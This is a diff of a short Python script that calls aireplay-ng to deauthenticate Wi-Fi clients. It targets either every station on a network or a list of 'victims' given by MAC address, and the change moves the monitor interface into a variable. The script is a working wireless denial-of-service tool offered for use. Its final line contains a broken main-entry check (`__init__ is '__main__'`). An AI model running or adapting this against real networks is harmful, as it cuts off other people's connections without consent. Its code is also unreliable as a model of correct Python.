@@ -1,9 +1,12 @@
 #! /usr/bin/env python
-
 import subprocess
 import sys
 
-#Network with multiple known associated stations:
+#Deauthenticate all clients (You should use aircrack-ng directly):
+network   = "00:00:00:00:00:00"
+victims   = []
+
+#Deauthenticate these specific clients:
 #network = "00:00:00:00:00:00"
 #victims = [
 #    "00:00:00:00:00:11", #Client 01
@@ -12,20 +15,18 @@ import sys
 #    "00:00:00:00:00:44", #Client 04
 #    "00:00:00:00:00:55"] #Client 05
 
-#Network without any known associated station:
-network = '00:00:00:00:00:00'
-victims = []
+interface = "wlan1mon"
 
 def deauth_all_clients(net):
     '''There's no point using this script if you're not gonna specify specific
        clients. You should probably use aireplay-ng directly'''
     print "\n[+] Deauthenticating all clients in the network\n"
-    command = "aireplay-ng -a {0} mon0".format(net)
+    command = "aireplay-ng -a {0} {1}".format(net, interface)
     subprocess.call([command], shell=True) #Runs forever
 
 def deauth_client(net, cli):
     print "\n[+] Deauthenticating {0}\n".format(cli)
-    command = "aireplay-ng -a {0} -c {1} -0 3 mon0".format(net, cli)
+    command = "aireplay-ng -a {0} -c {1} -0 3 {2}".format(net, cli, interface)
     subprocess.call([command], shell=True)
 
 if __init__ is '__main__':
